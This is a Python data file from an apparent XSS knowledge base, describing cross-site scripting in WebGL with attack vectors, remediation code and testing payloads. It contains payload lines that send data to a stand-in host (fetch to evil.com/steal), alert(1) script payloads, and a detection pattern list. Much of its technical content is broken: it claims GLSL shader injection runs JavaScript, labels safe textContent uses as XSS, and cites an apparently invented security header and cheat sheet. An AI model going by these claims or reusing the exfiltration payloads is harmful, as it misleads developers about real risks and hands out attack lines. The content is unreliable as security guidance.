#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easyprotech)
Dev: Brabus
Date: Sat 25 Oct 2025 12:00:00 UTC
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: WebGL XSS Context - Comprehensive Guide
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) in WebGL Context",
    # Metadata for SIEM/Triage Integration
    "severity": "medium",
    "cvss_score": 6.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "webgl", "shader-injection", "gpu", "3d-graphics"],
    "description": """
WebGL XSS occurs when user input is reflected into WebGL shaders, textures, or rendering contexts
without proper sanitization. WebGL (Web Graphics Library) is a JavaScript API for rendering 3D
and 2D graphics in web browsers using GPU acceleration. When malicious GLSL (OpenGL Shading Language)
code is injected into shaders or when user-controlled data is used in WebGL rendering, it can lead
to code execution and information disclosure.

VULNERABILITY CONTEXT:
WebGL XSS typically happens when:
1. User input is injected into shader source code
2. Texture data contains malicious content
3. Uniform variables are set with unsanitized data
4. Vertex data contains executable content
5. Framebuffer operations are manipulated
6. Shader compilation with user-controlled parameters

Common in:
- 3D visualization applications
- Game engines (Three.js, Babylon.js)
- Data visualization tools
- CAD/CAM web applications
- Medical imaging viewers
- Scientific simulation platforms
- Virtual reality applications
- Graphics design tools

SEVERITY: MEDIUM
WebGL XSS requires specific conditions and GPU processing, making it less common than traditional XSS.
However, successful exploitation can lead to GPU-based code execution and information disclosure
through rendering channels.
""",
    "attack_vector": """
WEBGL XSS ATTACK VECTORS:

1. VERTEX SHADER INJECTION:
   Shader source code injection:
   const vertexShaderSource = 'attribute vec4 aVertexPosition; ' +
                             'uniform mat4 uModelViewMatrix; ' +
                             'void main() { ' +
                             'gl_Position = uModelViewMatrix * aVertexPosition; ' +
                             USER_INPUT +  // Shader injection
                             '}';

   Attack payload:
   '; gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0); /*

2. FRAGMENT SHADER INJECTION:
   Fragment shader with XSS:
   const fragmentShaderSource = 'precision mediump float; ' +
                                'void main() { ' +
                                USER_INPUT +  // Fragment injection
                                '}';

   Attack payload:
   'gl_FragColor = vec4(0.0, 1.0, 0.0, 1.0); fetch("http://evil.com/steal", {method: "POST", body: "xss"}); /*

3. UNIFORM VARIABLE INJECTION:
   Setting uniform variables with XSS:
   const shaderProgram = initShaderProgram(gl, vsSource, fsSource);

   // Setting uniform with user data
   gl.uniform1f(shaderProgram.uTime, USER_INPUT);  // Time uniform injection
   gl.uniform3fv(shaderProgram.uColor, USER_INPUT); // Color uniform injection

4. TEXTURE DATA INJECTION:
   Creating textures with malicious content:
   const texture = gl.createTexture();
   gl.bindTexture(gl.TEXTURE_2D, texture);

   const imageData = new ImageData(new Uint8ClampedArray(USER_INPUT), width, height);
   gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, imageData);

5. VERTEX BUFFER INJECTION:
   Vertex array with malicious data:
   const vertices = new Float32Array([
     -1.0, -1.0, 0.0,
     1.0, -1.0, 0.0,
     0.0, 1.0, 0.0,
     USER_INPUT  // Vertex data injection
   ]);

ADVANCED WEBGL XSS TECHNIQUES:

6. SHADER PRECISION INJECTION:
   Precision qualifier injection:
   const shaderSource = USER_INPUT + ' float; ' +  // Precision injection
                       'void main() { gl_FragColor = vec4(1.0); }';

   Attack payload:
   'highp /* alert(1) */'

7. EXTENSION INJECTION:
   WebGL extensions with XSS:
   const ext = gl.getExtension('WEBGL_debug_renderer_info');
   const renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);

   // Renderer info might contain XSS if user-controlled
   document.getElementById('info').textContent = USER_INPUT;

8. FRAMEBUFFER ATTACK:
   Off-screen rendering with XSS:
   const framebuffer = gl.createFramebuffer();
   gl.bindFramebuffer(gl.FRAMEBUFFER, framebuffer);

   // Render to texture with malicious content
   const texture = createTextureFromData(USER_INPUT);

9. TRANSFORM FEEDBACK INJECTION:
   Transform feedback with malicious data:
   const transformFeedback = gl.createTransformFeedback();
   gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, transformFeedback);

   // Feedback data might contain XSS
   const buffer = gl.createBuffer();
   gl.bindBuffer(gl.TRANSFORM_FEEDBACK_BUFFER, buffer);

10. WEBGL CONTEXT ATTRIBUTES INJECTION:
    Context creation with XSS:
    const contextAttributes = {
      alpha: true,
      depth: true,
      stencil: false,
      antialias: false,
      premultipliedAlpha: false,
      preserveDrawingBuffer: true,
      failIfMajorPerformanceCaveat: false,
      userData: USER_INPUT  // Custom attribute injection
    };

11. SHADER COMPILATION LOG INJECTION:
    Compilation errors with XSS:
    const vertexShader = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vertexShader, maliciousShaderCode);
    gl.compileShader(vertexShader);

    if (!gl.getShaderParameter(vertexShader, gl.COMPILE_STATUS)) {
      const log = gl.getShaderInfoLog(vertexShader);
      document.getElementById('error').innerHTML = log;  // Log injection
    }

12. PROGRAM LINKING INJECTION:
    Linking shaders with XSS in attributes:
    const program = gl.createProgram();
    gl.attachShader(program, vertexShader);
    gl.attachShader(program, fragmentShader);
    gl.linkProgram(program);

    const attribLocation = gl.getAttribLocation(program, USER_INPUT);  // Attribute name injection

13. RENDER TARGET INJECTION:
    Multiple render targets with XSS:
    const drawBuffers = gl.getExtension('WEBGL_draw_buffers');

    // Render target names might be user-controlled
    const targetNames = [USER_INPUT, 'color', 'normal'];
    drawBuffers.drawBuffersWEBGL(targetNames);

14. QUERY OBJECT INJECTION:
    WebGL query objects with XSS:
    const query = gl.createQuery();
    gl.beginQuery(gl.ANY_SAMPLES_PASSED, query);

    // Query results might be displayed
    gl.endQuery(gl.ANY_SAMPLES_PASSED);
    const result = gl.getQueryParameter(query, gl.QUERY_RESULT);
    displayResult(result);

15. SYNC OBJECT INJECTION:
    WebGL sync objects with malicious data:
    const sync = gl.fenceSync(gl.SYNC_GPU_COMMANDS_COMPLETE, 0);
    gl.clientWaitSync(sync, 0, 0);

    // Sync status might contain XSS
    const status = gl.getSyncParameter(sync, gl.SYNC_STATUS);
    showStatus(status);

WEBGL-SPECIFIC BYPASSES:

16. COMMENT-BASED INJECTION:
    GLSL comments with XSS:
    const shaderSource = '/* ' + USER_INPUT + ' */ void main() { gl_FragColor = vec4(1.0); }';

    Attack payload:
    '*/ alert(1); /*'

17. PREPROCESSOR INJECTION:
    GLSL preprocessor directives with XSS:
    const shaderSource = USER_INPUT + ' \\n void main() { gl_FragColor = vec4(1.0); }';

    Attack payload:
    '#define main() alert(1); void main'

18. VERSION INJECTION:
    GLSL version string injection:
    const versionString = USER_INPUT;  // Version injection
    const shaderSource = versionString + ' \\n void main() { gl_FragColor = vec4(1.0); }';

19. EXTENSION STRING INJECTION:
    Extension strings with XSS:
    const extensions = gl.getSupportedExtensions();
    const extensionString = extensions.join(', ');

    // If extension names are user-controlled
    document.getElementById('extensions').textContent = USER_INPUT;

20. VENDOR INFO INJECTION:
    GPU vendor information:
    const vendor = gl.getParameter(gl.VENDOR);
    const renderer = gl.getParameter(gl.RENDERER);

    // Vendor/renderer might be displayed with XSS
    document.getElementById('gpu-info').innerHTML = '<b>' + USER_INPUT + '</b>';

REAL-WORLD ATTACK SCENARIOS:

21. 3D MODELING APPLICATION:
    - User uploads 3D model
    - Model metadata: <script>alert(1)</script>
    - Model name displayed in UI
    - XSS when viewing model properties

22. DATA VISUALIZATION:
    - Interactive charts and graphs
    - Dataset labels: <script>alert(1)</script>
    - Labels rendered in WebGL context
    - Affects all viewers of visualization

23. ONLINE GAME ENGINE:
    - WebGL-based game
    - Player avatar name: <script>alert(1)</script>
    - Name displayed in 3D space
    - All players see XSS execution

24. MEDICAL IMAGING:
    - DICOM viewer with WebGL
    - Patient name: <script>alert(1)</script>
    - Name displayed on scan
    - Medical data theft

25. CAD/CAM APPLICATION:
    - 3D design tool
    - Part name: <script>alert(1)</script>
    - Part properties display
    - Design data manipulation

26. VIRTUAL REALITY PLATFORM:
    - VR application with WebGL
    - User profile: <script>alert(1)</script>
    - Profile displayed in virtual space
    - VR session hijacking

27. GRAPHICS DESIGN TOOL:
    - Online Photoshop-style app
    - Layer name: <script>alert(1)</script>
    - Layer properties display
    - Project corruption

WEBGL XSS DETECTION:

28. MANUAL TESTING:
    - Browser DevTools WebGL inspection
    - Shader source code review
    - Texture data analysis
    - GPU memory inspection

29. AUTOMATED SCANNING:
    - WebGL context analysis
    - Shader compilation testing
    - Texture validation
    - GPU resource monitoring

30. BROWSER EXTENSIONS:
    - WebGL debugging extensions
    - Shader inspection tools
    - GPU memory analyzers
""",
    "remediation": """
WEBGL XSS DEFENSE STRATEGY:

1. SHADER SOURCE VALIDATION (PRIMARY DEFENSE):
   Validate shader source code before compilation:

   function validateShaderSource(source) {
     // Remove comments that might contain XSS
     source = source.replace(/\/\*[\s\S]*?\*\/|\/\/.*/g, '');

     // Check for dangerous patterns
     const dangerousPatterns = [
       /alert\s*\(/i,
       /eval\s*\(/i,
       /fetch\s*\(/i,
       /XMLHttpRequest/i,
       /document\./i,
       /window\./i,
       /location\./i
     ];

     for (const pattern of dangerousPatterns) {
       if (pattern.test(source)) {
         throw new Error('Invalid shader source');
       }
     }

     return source;
   }

2. GLSL CODE SANITIZATION:
   Sanitize GLSL code elements:

   function sanitizeGLSLCode(code) {
     // Remove HTML tags
     code = code.replace(/<[^>]*>/g, '');

     // Remove JavaScript-like constructs
     code = code.replace(/javascript:/gi, '');
     code = code.replace(/vbscript:/gi, '');

     // Validate GLSL syntax
     if (!isValidGLSLSyntax(code)) {
       throw new Error('Invalid GLSL syntax');
     }

     return code;
   }

3. UNIFORM VARIABLE VALIDATION:
   Validate uniform variables:

   function validateUniformValue(value, type) {
     switch (type) {
       case 'float':
       case 'int':
         if (typeof value !== 'number' || !isFinite(value)) {
           throw new Error('Invalid uniform value');
         }
         break;

       case 'vec2':
       case 'vec3':
       case 'vec4':
         if (!Array.isArray(value) || value.length !== parseInt(type.slice(3))) {
           throw new Error('Invalid vector value');
         }
         break;

       case 'mat2':
       case 'mat3':
       case 'mat4':
         if (!Array.isArray(value) || !isValidMatrix(value, type)) {
           throw new Error('Invalid matrix value');
         }
         break;
     }

     return value;
   }

4. TEXTURE DATA VALIDATION:
   Validate texture data:

   function validateTextureData(data, width, height) {
     if (!data || data.length !== width * height * 4) {
       throw new Error('Invalid texture dimensions');
     }

     // Check for malicious patterns in texture data
     const textDecoder = new TextDecoder('utf-8');
     const textData = textDecoder.decode(data);

     if (textData.includes('<script') || textData.includes('javascript:')) {
       throw new Error('Malicious texture data detected');
     }

     return data;
   }

5. WEBGL CONTEXT SECURITY:
   Secure WebGL context creation:

   const contextAttributes = {
     alpha: true,
     depth: true,
     stencil: true,
     antialias: true,
     premultipliedAlpha: true,
     preserveDrawingBuffer: false,  // Security: don't preserve buffer
     failIfMajorPerformanceCaveat: false
   };

   const gl = canvas.getContext('webgl', contextAttributes) ||
              canvas.getContext('experimental-webgl', contextAttributes);

6. SHADER COMPILATION SECURITY:
   Secure shader compilation:

   function compileShaderSecurely(gl, source, type) {
     const sanitizedSource = validateShaderSource(source);
     const shader = gl.createShader(type);
     gl.shaderSource(shader, sanitizedSource);
     gl.compileShader(shader);

     if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
       const log = gl.getShaderInfoLog(shader);
       logger.error('Shader compilation failed', {log: log});
       gl.deleteShader(shader);
       throw new Error('Shader compilation failed');
     }

     return shader;
   }

7. ERROR HANDLING:
   Secure error handling:

   gl.getShaderInfoLog = (function(originalFunction) {
     return function(shader) {
       const log = originalFunction.apply(this, arguments);

       // Sanitize error log before returning
       const cleanLog = log.replace(/<[^>]*>/g, '');
       return cleanLog;
     };
   })(gl.getShaderInfoLog);

8. RESOURCE LIMITS:
   Implement WebGL resource limits:

   const MAX_TEXTURE_SIZE = 2048;
   const MAX_SHADER_LENGTH = 65536;
   const MAX_UNIFORMS = 1024;

   function checkResourceLimits() {
     const maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
     const maxShaderLength = gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS) * 16;

     if (maxTextureSize > MAX_TEXTURE_SIZE) {
       logger.warn('Texture size limit exceeded');
     }
   }

9. WEBGL EXTENSION SECURITY:
   Secure WebGL extensions:

   function getSecureExtension(name) {
     const allowedExtensions = [
       'WEBGL_debug_renderer_info',
       'OES_texture_float',
       'OES_standard_derivatives',
       'WEBGL_depth_texture'
     ];

     if (!allowedExtensions.includes(name)) {
       throw new Error('Extension not allowed');
     }

     return gl.getExtension(name);
   }

10. VERTEX DATA VALIDATION:
    Validate vertex data:

    function validateVertexData(vertices) {
      if (!Array.isArray(vertices) && !(vertices instanceof Float32Array)) {
        throw new Error('Invalid vertex data type');
      }

      // Check for NaN and Infinity
      for (let i = 0; i < vertices.length; i++) {
        if (!isFinite(vertices[i])) {
          throw new Error('Invalid vertex value');
        }
      }

      return vertices;
    }

11. FRAMEBUFFER SECURITY:
    Secure framebuffer operations:

    function validateFramebufferTarget(target) {
      const validTargets = [gl.FRAMEBUFFER, gl.READ_FRAMEBUFFER, gl.DRAW_FRAMEBUFFER];

      if (!validTargets.includes(target)) {
        throw new Error('Invalid framebuffer target');
      }

      return target;
    }

12. CSP FOR WEBGL:
    Content Security Policy:

    Content-Security-Policy:
      default-src 'self';
      script-src 'self' 'nonce-{random}';
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: blob:;
      media-src 'self';
      connect-src 'self';
      object-src 'none';

13. GPU INFORMATION SECURITY:
    Secure GPU information handling:

    function getSecureGPUInfo() {
      if (gl.getExtension('WEBGL_debug_renderer_info')) {
        const vendor = gl.getParameter(gl.VENDOR);
        const renderer = gl.getParameter(gl.RENDERER);

        // Don't expose GPU information to users
        logger.info('GPU Info', {vendor: vendor, renderer: renderer});

        // Return generic information only
        return {
          webgl: true,
          extensions: gl.getSupportedExtensions().length
        };
      }
    }

14. LOGGING AND MONITORING:
    Comprehensive WebGL monitoring:

    function logWebGLOperation(operation, details) {
      logger.info('WebGL operation', {
        operation: operation,
        details: details,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
      });
    }

15. TESTING AND VALIDATION:
    Regular security testing:

    Automated tests:
    - WebGL context validation
    - Shader compilation testing
    - Texture data validation
    - GPU resource monitoring

    Manual tests:
    - DevTools WebGL inspection
    - Shader source review
    - GPU memory analysis

SECURITY TESTING PAYLOADS:

Basic WebGL XSS:
gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0); /* alert(1) */
gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0); // alert(1)
gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0); /* fetch('http://evil.com/steal') */

Shader injection:
precision mediump float; alert(1); void main() {}
#define main() alert(1); void main
/* alert(1) */ void main() { gl_FragColor = vec4(1.0); }

Advanced payloads:
#version 100 alert(1); void main() {}
#extension all : alert(1); void main() {}

WEBGL SECURITY HEADERS:

Content-Security-Policy: script-src 'self' 'nonce-{random}'
X-Content-Type-Options: nosniff
X-WebGL-Context: secure

MONITORING METRICS:

Monitor for:
- Unusual shader compilation patterns
- Large texture uploads
- GPU memory anomalies
- WebGL context errors
- Extension usage patterns

OWASP REFERENCES:
- OWASP WebGL Security Cheat Sheet
- WebGL Security Best Practices
- GPU Security Considerations
- 3D Graphics Security Guide
""",
}
